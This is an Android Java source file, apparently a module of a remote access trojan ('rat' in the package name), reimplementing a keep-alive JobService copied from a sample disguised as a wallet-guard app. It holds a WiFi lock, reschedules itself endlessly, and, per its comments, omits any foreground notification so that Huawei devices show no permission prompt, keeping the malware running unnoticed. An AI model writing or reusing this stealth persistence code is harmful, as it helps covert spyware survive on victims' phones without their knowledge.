package com.vendor.rat.keepalive.service;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.net.wifi.WifiManager;
import android.util.Log;

/**
 * 保活 JobService (模块 07)
 *
 * 对齐 vendor: com.guard.wallet.service.WIFIBackgroundService extends JobService
 *
 * vendor 实现:
 *   - 只持有 WifiLock (WIFI_MODE_FULL_HIGH_PERF) 保持 WiFi 连接
 *   - 无前台通知、无 NotificationChannel、无 WakeLock
 *   - onStartJob 获取 WifiLock 后立即 jobFinished(params, true)
 *   - reschedule=true 确保 Job 被重新调度
 *
 * 注意: vendor 没有 startForeground/createNotificationChannel，
 * 如果添加会触发华为 EMUI 通知权限弹窗
 */
public class WIFIBackgroundService extends JobService {

    private static final String TAG = "WIFIBgService";

    private WifiManager.WifiLock wifiLock;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "onCreate - Thread ID = " + Thread.currentThread().getId());
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm != null) {
            // vendor: wifiManager.createWifiLock(3, "MyWifiLockTag")
            // 3 = WIFI_MODE_FULL_HIGH_PERF
            this.wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "MyWifiLockTag");
            this.wifiLock.setReferenceCounted(false);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWifiLock();
    }

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.i(TAG, "onStartJob - jobId = " + params.getJobId()
                + ", Thread ID = " + Thread.currentThread().getId());
        if (wifiLock != null && !wifiLock.isHeld()) {
            wifiLock.acquire();
        }
        // vendor: jobFinished(params, true) — reschedule=true
        jobFinished(params, true);
        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.i(TAG, "onStopJob - jobId = " + params.getJobId()
                + ", Thread ID = " + Thread.currentThread().getId());
        releaseWifiLock();
        return false;
    }

    private void releaseWifiLock() {
        if (wifiLock != null && wifiLock.isHeld()) {
            wifiLock.release();
        }
    }
}
